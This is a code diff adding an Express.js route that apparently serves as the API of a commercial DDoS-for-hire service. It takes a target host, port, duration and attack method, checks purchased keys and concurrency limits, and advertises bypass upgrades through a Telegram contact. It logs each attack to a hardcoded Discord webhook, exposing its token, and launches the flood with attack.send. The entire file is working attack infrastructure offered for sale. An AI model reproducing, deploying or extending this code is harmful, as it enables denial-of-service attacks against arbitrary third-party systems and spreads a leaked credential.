@@ -1,0 +1,204 @@
+const express = require("express");
+const attack = require("../attack");
+const fs = require("fs");
+const fetch = require('node-fetch');
+const router = express.Router();
+// Slot sayısı ve slotların başlangıç değeri
+let slots = 0;
+const maxSlots = 5;
+const slotResetTime = 100000;
+const blacklist = ["https://shitflare.asia/", "https://176.9.16.251/", "http://88.198.48.45/", "https://kie2.cdn.i-ua.tv/", "https://zetvideo.net/", "https://content.weyyak.ae/hit", "https://file.cunhua.today/", "https://provo-downloadcontent.opensuse.org/", "https://ogcdn.mom/", "https://s2-n10-nl-cdn.eporner.com/", "https://s3-n10-nl-cdn.eporner.com/", "https://s4-n10-nl-cdn.eporner.com/", "https://hitme.ventox.lol/", "https://tls.mrrage.xyz/nginx_status", "https://forum.ventox.lol/", "https://grafana.ventox.lol/", "https://hitsagainstaraid.click/", "https://bnt.vodka/dstat", "https://xnexustesting.eu/", "https://webstress.xyz/"]
+const bypassedKeys = ["dekurlasqsxc", "tatap321", "flapusiek33lala", "ogkush334", "230pxd3", "dekurlasqs23"]; // slot bypass
+const alreadybypass = ["dekurlasqsxc", "tatap321", "ogkush334", "flexvip312", "dekurlasqs23", "wpzxcp"] // spam bypass
+const vipUsers = ["dekurlasqsxc", "testkey344"]; // vip users
+const vipMethods = ["GAME-VIP", "SOCKET-VIP", "MIXAMP"]
+
+const attackedHosts = {};
+
+router.get("/", async (req, res) => {
+    const host = req.query.host;
+    const port = req.query.port;
+    const time = parseInt(req.query.time);
+    const method = req.query.method;
+    const key = req.query.key;
+
+    const keyFile = fs.readFileSync("keys.json");
+    let keyData = JSON.parse(keyFile);
+
+    const methodFile = fs.readFileSync("methods.json");
+    let methods = JSON.parse(methodFile);
+
+    try {
+        parseInt(time);
+    } catch (err) {
+        return res.send(`
+        <html>
+        <head>
+         <link rel="icon" href="icon.png" type="image/x-icon">
+        </head>
+        </html>
+        <body style='background-color:white'>Time is Invalid`);
+            }
+        
+        
+            try {
+                parseInt(port);
+            } catch (err) {
+                return res.send(`
+        <html>
+        <head>
+         <link rel="icon" href="icon.png" type="image/x-icon">
+        </head>
+        </html>
+        <body style='background-color:white'>Port is Invalid`);
+            }
+        
+        
+            if (!(host && port && time && method && key)) return await res.send(`
+        <html>
+        <head>
+         <link rel="icon" href="icon.png" type="image/x-icon">
+        </head>
+        </html>
+        <body style='background-color:white'>Missing Parameters`);
+            if (!keyData[key] && !bypassedKeys.includes(key)) return await res.send(`
+            <html>
+            <center>
+            <head>
+             <link rel="icon" href="icon.png" type="image/x-icon">
+            </head>
+            </html>
+            <body style='background-color:white'>Key Is Invalid, to purchase plan » <h1>t.me/@DEKURLAS</h1>
+            </center>`);
+            if (!methods.includes(method.toUpperCase())) return await res.send(`
+        <html>
+        <head>
+         <link rel="icon" href="icon.png" type="image/x-icon">
+        </head>
+        </html>
+        <body style='background-color:white'>Invalid Method`);
+            if (time === 0) return await res.send(`
+        <html>
+        <head>
+         <link rel="icon" href="icon.png" type="image/x-icon">
+        </head>
+        </html>
+        <body style='background-color:white'>Time Cannot be 0.`);
+            if (host.includes(blacklist)) return res.send(`
+            <html>
+            <center>
+            <head>
+             <link rel="icon" href="icon.png" type="image/x-icon">
+            </head>
+            </html>
+            <body style='background-color:#1D1E26 color:white'>This Target Blacklisted, to purchase Blacklist Bypass » <h1>t.me/@DEKURLAS</h1>
+            </center>`);
+            if (time > keyData[key]["time"]) return await res.send(`
+            <html>
+            <center>
+            <head>
+             <link rel="icon" href="icon.png" type="image/x-icon">
+            </head>
+            </html>
+            <body style='background-color:#1D1E26 color:white'>Max Time Reached, to upgrade your seconds » <h1>t.me/@DEKURLAS</h1>
+            </center>`);
+            if (keyData[key].curCons >= keyData[key].maxCons) return await res.send(`
+            <html>
+            <center>
+            <head>
+             <link rel="icon" href="icon.png" type="image/x-icon">
+            </head>
+            </html>
+            <body style='background-color:#1D1E26 color:white'>Maximum Concurrents Reached, to upgrade your concurrents » <h1>t.me/@DEKURLAS</h1>
+            </center>`);
+            if (slots >= maxSlots && !bypassedKeys.includes(key)) return res.send(`
+            <html>
+            <center>
+            <head>
+             <link rel="icon" href="icon.png" type="image/x-icon">
+            </head>
+            </html>
+            <body style='background-color:#1D1E26 color:white'>Maximum Slots Reached, If You Want Slot Bypass » <h1>t.me/@DEKURLAS</h1>
+            </center>`);
+        if (vipUsers.includes(key) && method.includes(vipMethods)) return res.send(`<html>
+        <center>
+        <head>
+         <link rel="icon" href="icon.png" type="image/x-icon">
+        </head>
+        </html>
+        <body style='background-color:#1D1E26 '>This method only for VIP Users, to purchase VIP » <h1>t.me/@DEKURLAS</h1>
+        </center>`);
+        
+            
+            if (attackedHosts[host] && Date.now() < attackedHosts[host] && !alreadybypass.includes(key)) {
+                const remainingTime = Math.ceil((attackedHosts[host] - Date.now()) / 1000);
+                return await res.send(`
+        <html>
+        <head>
+         <link rel="icon" href="icon.png" type="image/x-icon">
+        </head>
+        </html>
+        <body style='background-color:cyan'>Target already attacked, wait ${remainingTime} seconds`);
+            }
+        
+            slots++;
+if (host === "1.1.1.1") {}
+
+    const params = {
+        username: "API Logs",
+        avatar_url: "",
+        embeds: [
+            {
+                "title": "New Attack",
+                "color": 15258703,
+                "description": `**HOST:** ${host}\n**PORT:** ${port}\n**TIME:** ${time}\n**METHOD:** ${method}\n**KEY:** ${key}`
+            }
+        ]
+    }
+
+    fetch("https://discord.com/api/webhooks/1118269064981250221/99Y4cp96Z-0xd3klKJgiPyNTzEZZr8ZKs08okHrQ3fhT-H_msfK-2LKOSXJ7CwJVPUtX", {
+        method: "POST",
+        headers: {
+            'Content-type': 'application/json'
+        },
+        body: JSON.stringify(params)
+    });
+
+    attack.send(host, port, time, method);
+
+    keyData[key].curCons += 1;
+    await fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {
+        res.send(`
+<style>
+div.a {
+	text-align: center;
+}
+</style>
+
+
+<div class="a">
+<body style='background-color:white'
+<h2>Successfull</h2>
+<p>Host: ${host}</p>
+<p>--------------</p>
+<p>Port: ${port}</p>
+<p>--------------</p>
+<p>Time: ${time}</p>
+<p>--------------</p>
+<p>Method: ${method}</p>
+</div>`);
+        setTimeout(() => {
+            keyData[key].curCons -= 1;
+            fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {});
+        }, parseInt(time) * 1000);
+
+        attackedHosts[host] = Date.now() + time * 1000;
+
+        // Slot sayısını azalt
+        setTimeout(() => {
+            slots = Math.max(0, slots - 1);
+        }, slotResetTime);
+    });
+});
+
+module.exports = router;
